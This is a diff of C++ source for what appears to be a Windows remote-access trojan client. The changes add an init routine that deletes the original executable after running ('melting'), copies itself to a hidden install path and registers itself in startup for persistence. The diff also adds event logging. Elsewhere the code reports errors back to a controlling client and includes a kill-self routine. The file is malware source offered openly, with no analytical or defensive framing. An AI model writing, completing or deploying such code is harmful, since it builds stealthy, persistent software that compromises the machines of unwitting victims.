@@ -1,4 +1,4 @@
-#include "includes.h"
+#include "general.h"
 
 std::string General::currentPath;			//current path of executable
 std::string General::installFolder;		//path of folder it should be installed to
@@ -6,6 +6,45 @@ std::string General::installPath;			//full path where executable should be insta
 bool General::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
 									//instead of proceeding to the main loop)
 LPTSTR General::lpArguments;
+
+
+bool General::init()	//startup of program
+{
+	//VARIABLE SETUP
+	currentPath = getCurrentPath();
+	installFolder = getInstallFolder();
+	installPath = getInstallPath(installFolder);
+
+
+
+	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
+	{
+		remove(lpArguments);
+	}
+
+	if (Settings::installSelf)
+	{
+		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
+		{
+			setLocation();
+			installing = true;
+		}
+	}
+
+	if (Settings::setStartupSelf)			//checks if it should set itself into startup
+	{
+		if (!startupSet())				//checks if it's startup is set
+		{
+			setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installPath).c_str() : Conversion::convStringToWidestring(currentPath).c_str(), NULL);
+		}
+	}
+
+
+	runInstalled();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
+
+
+	return installing;
+}
 
 bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
 {
@@ -135,6 +174,7 @@ bool General::startupSet()		//checks if executable is starting on boot
 		return false;
 }
 
+
 bool General::installed()		//checks if executable is installed properly (location + startup)
 {
 	if (startupSet() && locationSet())
@@ -143,6 +183,17 @@ bool General::installed()		//checks if executable is installed properly (locatio
 		return false;
 }
 
+
+std::string General::currentDateTime()
+{
+	time_t     now = time(0);
+	struct tm  tstruct;
+	char       buf[80];
+	localtime_s(&tstruct, &now);
+	strftime(buf, sizeof(buf), "%d/%m/%Y [%X]", &tstruct);
+
+	return buf;
+}
 
 
 void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
@@ -183,10 +234,13 @@ void General::handleError(int errType, bool errSevere)	//handles errors
 		{
 		case 1:		//general error
 			Client::clientptr->sendError("General error");
+			return;
 		case 2:		//cmd error		
 			Client::clientptr->sendError("CMD error");
+			return;
 		case 3:		//networking error
 			Client::clientptr->sendError("Networking error");
+			return;
 		}
 		
 	}
@@ -243,7 +297,13 @@ void General::killSelf()
 
 void General::log(std::string message)
 {
-
+	if (Settings::logEvents)
+	{
+		std::ofstream logFile;
+		logFile.open(installFolder + "\\" + Settings::logFileName, std::ios_base::app);
+		logFile << currentDateTime() << ": " << message << std::endl;
+		logFile.close();
+	}
 }
 
 
@@ -263,7 +323,7 @@ void General::runInstalled()		//checks if this run of the program is designated 
 	if (General::installing)
 		if (!Settings::startOnNextBoot)
 		{
-			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? convStringToLPTSTR("t " + General::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
+			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + General::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
 		}
 
 }
